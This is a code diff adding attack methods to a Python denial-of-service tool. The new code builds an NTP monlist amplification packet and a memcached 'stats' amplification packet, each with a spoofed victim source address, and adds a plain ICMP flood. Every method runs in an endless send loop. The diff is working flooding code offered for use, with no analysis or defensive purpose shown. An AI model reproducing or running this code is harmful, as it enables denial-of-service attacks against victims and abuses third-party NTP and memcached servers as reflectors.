@@ -47,8 +47,10 @@ methods:
 2.Cloudfare
 3.GET
 4.TCP
-5.TCP ABUSE
-6.UDP""")
+5.NTP
+6.UDP
+7.DNS (memcached packet)
+8.ICMP""")
 	exit()
 url = website
 fff = str(sys.argv[2])
@@ -95,7 +97,15 @@ if int(fff) == 4:
 		test232 = test232 + 1
 		print(str(test232) + " packets sent")
 if int(fff) == 5:
-	print("Currently broken or patched, will be fixed (if not patched) in later version")
+	test232 = 0
+	target = website
+	ntpserver = website
+	data = "\x17\x00\x03\x2a" + "\x00" * 4
+	packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) 
+	while True:
+		send(packet, verbose=0)
+		test232 = test232 + 1
+		print(str(test232) + " packets sent")
 	exit()
 if int(fff) == 6:
 	DESTINATION_IP = website
@@ -108,6 +118,23 @@ if int(fff) == 6:
 		test232 = test232 + 1
 		print(str(test232) + " packets sent")
 		udp_socket.sendto(payload,(DESTINATION_IP,DESTINATION_PORT))
+if int(fff) == 7:
+	test232 = 0
+	target = url
+	ip = target
+	payload = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
+	while True:
+		test232 = test232 + 1
+		print(str(test232) + " packets sent")
+		send(IP(src=target, dst=ip) / UDP(dport=11211) / Raw(load=payload), count=100, verbose=0)
+if int(fff) == 8:
+	test232 = 0
+	while True:
+		request = IP(dst=url)/ICMP()
+		send(request, verbose=0)
+		test232 = test232 + 1
+		print(str(test232) + " packets sent")
+	
 def check_url(url):
 	try:
 		cloudfare_check_url = requests.Session()
